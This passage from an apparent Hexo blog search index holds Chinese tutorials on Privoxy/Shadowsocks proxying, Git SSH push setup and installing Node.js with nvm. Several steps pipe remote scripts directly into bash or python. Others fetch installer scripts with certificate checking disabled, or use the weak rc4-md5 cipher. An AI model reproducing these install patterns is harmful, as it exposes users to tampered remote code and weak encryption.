</code></pre><h3 id="配置-Privoxy-1"><a href="#配置-Privoxy-1" class="headerlink" title="配置 Privoxy"></a>配置 Privoxy</h3><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim /etc/privoxy/config
</code></pre><p>或者使用 <code>gedit</code></p><pre><code class="bash">sudo gedit /etc/privoxy/config
</code></pre><p>修改监听地址</p><pre><code class="bash">listen-address  127.0.0.1:8118
</code></pre><p>按 <code>shift+g</code> 切到最后一行，添加</p><pre><code class="bash">forward-socks5 / 127.0.0.1:1080 .
</code></pre><h2 id="启动-Privoxy-1"><a href="#启动-Privoxy-1" class="headerlink" title="启动 Privoxy"></a>启动 Privoxy</h2><pre><code class="bash">sudo /etc/init.d/privoxy restart
</code></pre><h2 id="配置终端-http-代理-1"><a href="#配置终端-http-代理-1" class="headerlink" title="配置终端 http 代理"></a>配置终端 http 代理</h2><pre><code class="bash">export http_proxy=&quot;127.0.0.1:8118&quot;
export https_proxy=&quot;127.0.0.1:8118&quot;
</code></pre><p>为了方便还是在 <code>/etc/rc.local</code> 中添加如下命令，注意在 <code>exit 0</code> 之前。</p><pre><code class="bash">sudo /etc/init.d/privoxy start
</code></pre><h3 id="配置终端-http-代理的启动-1"><a href="#配置终端-http-代理的启动-1" class="headerlink" title="配置终端 http 代理的启动"></a>配置终端 http 代理的启动</h3><p>使用 <code>vim</code></p><pre><code class="bash">sudo vim ~/.bashrc
</code></pre><p>或者使用 <code>gedit</code></p><pre><code class="bash">sudo gedit ~/.bashrc
</code></pre><p>按 <code>shift+g</code> 切到最后一行，添加</p><pre><code class="bash">export http_proxy=&quot;127.0.0.1:8118&quot;
export https_proxy=&quot;127.0.0.1:8118&quot;
</code></pre><blockquote><p>如果此举会影响到终端下载，建议还是不要设置为好。</p></blockquote><h2 id="测试代理是否成功（需安装-curl）-1"><a href="#测试代理是否成功（需安装-curl）-1" class="headerlink" title="测试代理是否成功（需安装 curl）"></a>测试代理是否成功（需安装 curl）</h2><pre><code class="bash">curl //www.google.com.hk
</code></pre><p>返回带 <code>google</code> 字样表示受理成功</p><h2 id="配置-npm-代理（需安装-node、npm）-1"><a href="#配置-npm-代理（需安装-node、npm）-1" class="headerlink" title="配置 npm 代理（需安装 node、npm）"></a>配置 npm 代理（需安装 node、npm）</h2><pre><code class="bash">npm config set proxy //127.0.0.1:8118
npm config set https-proxy //127.0.0.1:8118
</code></pre><h3 id="清除-npm-代理-1"><a href="#清除-npm-代理-1" class="headerlink" title="清除 npm 代理"></a>清除 npm 代理</h3><pre><code class="bash">npm config delete proxy
npm config delete https-proxy
</code></pre><h1 id="附上-Shadowsocks-服务器搭建方法"><a href="#附上-Shadowsocks-服务器搭建方法" class="headerlink" title="附上 Shadowsocks 服务器搭建方法"></a>附上 Shadowsocks 服务器搭建方法</h1><blockquote><p>首先你要有一台专属于你的服务器，<a href="//www.hostker.com/">hostker</a> 这里提供较为便宜的服务器</p></blockquote><h2 id="更新软件源"><a href="#更新软件源" class="headerlink" title="更新软件源"></a>更新软件源</h2><p>安装前最好先更新一下软件源</p><pre><code class="bash">sudo apt-get update
sudo apt-get upgrade
</code></pre><h2 id="安装-Shadowsocks-服务端"><a href="#安装-Shadowsocks-服务端" class="headerlink" title="安装 Shadowsocks 服务端"></a>安装 Shadowsocks 服务端</h2><p>使用 <code>pip</code> 方式安装</p><pre><code class="bash">apt-get install python-pip
pip install shadowsocks
</code></pre><p>pip 安装时候可能会报错，执行以下命令再重新安装一次</p><pre><code class="bash">wget //bootstrap.pypa.io/ez_setup.py -O - | python
</code></pre><p>当然你也可以更新一下 <code>pip</code></p><pre><code class="bash">pip install --upgrade pip
</code></pre><h2 id="启动-Shadowsocks-服务端"><a href="#启动-Shadowsocks-服务端" class="headerlink" title="启动 Shadowsocks 服务端"></a>启动 Shadowsocks 服务端</h2><pre><code class="bash">ssserver -p 8388 -k password -m rc4-md5 --user nobody -d start
</code></pre><p>其中 <code>8388</code> 是远程服务器端口，<code>password</code> 是连接密码，<code>rc4-md5</code> 是加密方式</p><h2 id="Shadowsocks-Windows-端"><a href="#Shadowsocks-Windows-端" class="headerlink" title="Shadowsocks Windows 端"></a>Shadowsocks Windows 端</h2><blockquote><p><a href="//github.com/shadowsocks/shadowsocks-windows/releases">shadowsocks-windows</a></p></blockquote><h2 id="使用-shadowsocks-libev-一键安装脚本"><a href="#使用-shadowsocks-libev-一键安装脚本" class="headerlink" title="使用 shadowsocks-libev 一键安装脚本"></a>使用 shadowsocks-libev 一键安装脚本</h2><h3 id="默认配置："><a href="#默认配置：" class="headerlink" title="默认配置："></a>默认配置：</h3><ul><li>服务器端口：<code>8989</code></li><li>客户端端口：<code>1080</code></li><li>密码：自己设定（如不设定，默认为 <code>teddysun.com</code>）</li></ul><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><h4 id="CentOS-系统"><a href="#CentOS-系统" class="headerlink" title="CentOS 系统"></a>CentOS 系统</h4><pre><code class="bash">wget --no-check-certificate //raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev.sh
chmod +x shadowsocks-libev.sh
./shadowsocks-libev.sh 2&gt;&amp;1 | tee shadowsocks-libev.log
</code></pre><h4 id="Ubuntu，Debian-系统"><a href="#Ubuntu，Debian-系统" class="headerlink" title="Ubuntu，Debian 系统"></a>Ubuntu，Debian 系统</h4><pre><code class="bash">wget --no-check-certificate //raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh
chmod +x shadowsocks-libev-debian.sh
./shadowsocks-libev-debian.sh 2&gt;&amp;1 | tee shadowsocks-libev-debian.lo
</code></pre><h4 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h4><p>安装完成后，脚本提示如下：</p><pre><code class="bash">Congratulations, shadowsocks-libev install completed!
Your Server IP:your_server_ip
Your Server Port:8989
Your Password:your_password
Your Local IP:127.0.0.1
Your Local Port:1080
Your Encryption Method:aes-256-cfb

Welcome to visit://teddysun.com/357.html
Enjoy it!
</code></pre><h3 id="卸载方法："><a href="#卸载方法：" class="headerlink" title="卸载方法："></a>卸载方法：</h3><p>使用 <code>root</code> 用户登录，运行以下命令：</p><pre><code class="bash">./shadowsocks-libev.sh uninstall
</code></pre><h3 id="查看进程是否存在"><a href="#查看进程是否存在" class="headerlink" title="查看进程是否存在"></a>查看进程是否存在</h3><p>安装完成后即已后台启动 shadowsocks ，运行：</p><pre><code class="bash">ps -ef | grep ss-server | grep -v ps | grep -v grep
</code></pre><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><ul><li>启动：<code>/etc/init.d/shadowsocks start</code></li><li>停止：<code>/etc/init.d/shadowsocks stop</code></li><li>重启：<code>/etc/init.d/shadowsocks restart</code></li><li>查看状态：<code>/etc/init.d/shadowsocks status</code></li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> networking </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Network </tag>
            
            <tag> Node.js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git 远程推送配置]]></title>
      <url>/2016/07/git-push-setting/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>Git 是一个开源的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理<a id="more"></a></p><h1 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h1><p>如果你的系统还没有 Git，请通过以下命令安装</p><pre><code class="bash">sudo apt-get install git
</code></pre><h1 id="创建帐号"><a href="#创建帐号" class="headerlink" title="创建帐号"></a>创建帐号</h1><p>创建你的 GitHub 帐号，或者 Git@OSC 帐号</p><blockquote><p><a href="//github.com/">GitHub</a> 链接<br><br><a href="//git.oschina.net/">Git@OSC</a> 链接</p></blockquote><h1 id="liunx-创建-SSH-密钥"><a href="#liunx-创建-SSH-密钥" class="headerlink" title="liunx 创建 SSH 密钥"></a>liunx 创建 SSH 密钥</h1><pre><code class="bash">ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;
</code></pre><h2 id="添加-public-key"><a href="#添加-public-key" class="headerlink" title="添加 public key"></a>添加 public key</h2><p>查看你的 public key，并把它添加到您的账户中</p><blockquote><p>如 <a href="//github.com/settings/keys">GitHub key</a> 如 <a href="//git.oschina.net/profile/sshkeys">Git@OSC key</a></p></blockquote><p>使用以下命令查看</p><pre><code class="bash">cat /home/youname/.ssh/id_rsa.pub
</code></pre><h2 id="测试验证是否成功"><a href="#测试验证是否成功" class="headerlink" title="测试验证是否成功"></a>测试验证是否成功</h2><pre><code class="bash">ssh -T git@github.com
</code></pre><p>或</p><pre><code class="bash">ssh -T git@git.oschina.net
</code></pre><p>返回你在 <code>GitHub</code> 或 <code>Git@OSC</code> 上注册的用户名代表成功。</p><h1 id="GitHub-或-Git-OSC-上创建项目"><a href="#GitHub-或-Git-OSC-上创建项目" class="headerlink" title="GitHub 或 Git@OSC 上创建项目"></a>GitHub 或 Git@OSC 上创建项目</h1><blockquote><p><a href="//github.com/">GitHub</a> 链接<br><br><a href="//git.oschina.net/">Git@OSC</a> 链接</p></blockquote><h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><blockquote><p>请尽量保持你的名字和你的邮箱和 GitHub 或 Git@OSC 的注册一致。</p></blockquote><pre><code class="bash">git config --global user.name &quot;your name&quot;
git config --global user.email &quot;your email&quot;
</code></pre><h2 id="进入项目目录，初始化"><a href="#进入项目目录，初始化" class="headerlink" title="进入项目目录，初始化"></a>进入项目目录，初始化</h2><pre><code class="bash">git init
</code></pre><h2 id="添加项目至本地仓库"><a href="#添加项目至本地仓库" class="headerlink" title="添加项目至本地仓库"></a>添加项目至本地仓库</h2><pre><code class="bash">git add .
</code></pre><h2 id="提交并备注"><a href="#提交并备注" class="headerlink" title="提交并备注"></a>提交并备注</h2><pre><code class="bash">git commit -m &quot;first commit&quot;
git remote add origin git@github.com:[youName]/[appName].git
git push -u origin master
</code></pre><h2 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h2><pre><code class="bash">git pull origin master
</code></pre><h2 id="强制覆盖本地代码（更新本地源）"><a href="#强制覆盖本地代码（更新本地源）" class="headerlink" title="强制覆盖本地代码（更新本地源）"></a>强制覆盖本地代码（更新本地源）</h2><pre><code class="bash">git fetch --all
</code></pre><h2 id="创建一个新的标签并提交"><a href="#创建一个新的标签并提交" class="headerlink" title="创建一个新的标签并提交"></a>创建一个新的标签并提交</h2><pre><code class="bash">git tag -a v1.0.0 -m &quot;test@1.0.0&quot;
git push origin --tags
</code></pre><h2 id="查看本地标签"><a href="#查看本地标签" class="headerlink" title="查看本地标签"></a>查看本地标签</h2><pre><code class="bash">git tag
</code></pre><h1 id="git-中配置-autocrlf"><a href="#git-中配置-autocrlf" class="headerlink" title="git 中配置 autocrlf"></a>git 中配置 autocrlf</h1><h2 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h2><h3 id="源文件中是换行符是-LF"><a href="#源文件中是换行符是-LF" class="headerlink" title="源文件中是换行符是 LF"></a>源文件中是换行符是 LF</h3><p>如果你的源文件中是换行符是 LF，而 <code>autocrlf=true</code>， 此时 <code>Git add .</code> 就会遇到 <code>fatal: LF would be replaced by CRLF</code> 的错误。有两个解决办法：</p><ol><li>将你的源文件中的LF转为CRLF即可【推荐】</li><li>将autocrlf 设置为 false</li></ol><h3 id="源文件中是换行符是-CRLF"><a href="#源文件中是换行符是-CRLF" class="headerlink" title="源文件中是换行符是 CRLF"></a>源文件中是换行符是 CRLF</h3><p>如果你的源文件中是换行符是 CRLF，而 <code>autocrlf=input</code>， 此时 <code>Git add .</code> 也会遇到 <code>fatal: CRLF would be replaced by LF</code> 的错误。有两个解决办法：</p><ol><li>将你源文件中的CRLF转为LF【推荐】</li><li>将autocrlf 设置为true 或者 false</li></ol><h2 id="core-autocrlf"><a href="#core-autocrlf" class="headerlink" title="core.autocrlf"></a>core.autocrlf</h2><p>Git 可以在你提交时自动地把行结束符 CRLF 转换成 LF，而在签出代码时把 LF 转换成 CRLF。用 core.autocrlf 来打开此项功能，如果是在 Windows 系统上，把它设置成 true，这样当签出代码时，LF 会被转换成 CRLF：</p><pre><code class="bash">git config --global core.autocrlf true
</code></pre><p>Linux 或 Mac 系统使用 LF 作为行结束符，因此你不想 Git 在签出文件时进行自动的转换；当一个以 CRLF 为行结束符的文件不小心被引入时你肯定想进行修正，把 core.autocrlf 设置成 input 来告诉 Git 在提交时把 CRLF 转换成 LF，签出时不转换：</p><pre><code class="bash">git config --global core.autocrlf input
</code></pre><p>这样会在 Windows 系统上的签出文件中保留 CRLF，会在 Mac 和 Linux 系统上，包括仓库中保留LF。</p><p>如果你是 Windows 程序员，且正在开发仅运行在 Windows 上的项目，可以设置 false 取消此功能，把回车符记录在库中：</p><pre><code class="bash">git config --global core.autocrlf false
</code></pre><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>在 Mac/Liunx 上设置 <code>autocrlf = input</code>，在 Windows 上设置 autocrlf = true（默认值）。</p><p>Windows：（true） 提交时，将 CRLF 转成 LF 再提交；切出时，自动将 LF 转为 CRLF;</p><p>MAC/Linux: (input) 提交时，将 CRLF 转成 LF 再提交；切出时，保持LF即可</p><p>这样即可保证仓库中永远都是 LF. 而且在 Windows 工作空间都是 CRLF，在 Mac/linux 工作空间都是 LF</p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Protocol </tag>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 nvm 安装 Node.js]]></title>
      <url>/2016/07/usage-nvm-to-install-node-js/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>安装 Node.js 的最佳方式是使用 nvm。nvm 最开始是在 <code>Mac OS</code> 下开发的，所以 <code>Mac OS</code> 下同样使用 nvm 安装 Node.js<a id="more"></a></p><h1 id="下载-nvm"><a href="#下载-nvm" class="headerlink" title="下载 nvm"></a>下载 nvm</h1><h2 id="通过-curl-下载（需要安装-curl）"><a href="#通过-curl-下载（需要安装-curl）" class="headerlink" title="通过 curl 下载（需要安装 curl）"></a>通过 curl 下载（需要安装 curl）</h2><pre><code class="bash">apt-get install curl
curl -o- //raw.githubusercontent.com/creationix/nvm/v0.32.1/install.sh | bash
</code></pre><h2 id="通过-wget-下载（liunx-下载命令）"><a href="#通过-wget-下载（liunx-下载命令）" class="headerlink" title="通过 wget 下载（liunx 下载命令）"></a>通过 wget 下载（liunx 下载命令）</h2><pre><code class="bash">wget -qO- //raw.githubusercontent.com/creationix/nvm/v0.32.1/install.sh | bash
</code></pre><h1 id="重启终端，安装-Node-js"><a href="#重启终端，安装-Node-js" class="headerlink" title="重启终端，安装 Node.js"></a>重启终端，安装 Node.js</h1><pre><code class="bash">nvm install &lt;version&gt;
</code></pre><h2 id="设定-Node-js-的默认版本"><a href="#设定-Node-js-的默认版本" class="headerlink" title="设定 Node.js 的默认版本"></a>设定 Node.js 的默认版本</h2><pre><code class="bash">nvm alias defaults &lt;version&gt;
</code></pre><h2 id="查看-Node-js-和-npm-版本号"><a href="#查看-Node-js-和-npm-版本号" class="headerlink" title="查看 Node.js 和 npm 版本号"></a>查看 Node.js 和 npm 版本号</h2><pre><code class="bash">node -v
npm -v
</code></pre><h1 id="npm-淘宝换源"><a href="#npm-淘宝换源" class="headerlink" title="npm 淘宝换源"></a>npm 淘宝换源</h1><blockquote><p>npm 加载的模块，多数是国外源的，所以很容易被墙，解决办法，除了翻墙，还有就是 npm 换源，使用国内源，但是本人还是推介使用国外源，因为国外源较国内源稳定、全面。</p></blockquote><pre><code class="bash">npm install -g cnpm --registry=//registry.npm.taobao.org
</code></pre><h2 id="cnpm-安装模块"><a href="#cnpm-安装模块" class="headerlink" title="cnpm 安装模块"></a>cnpm 安装模块</h2><pre><code class="bash">cnpm install [name]
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> node.js </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Node.js </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
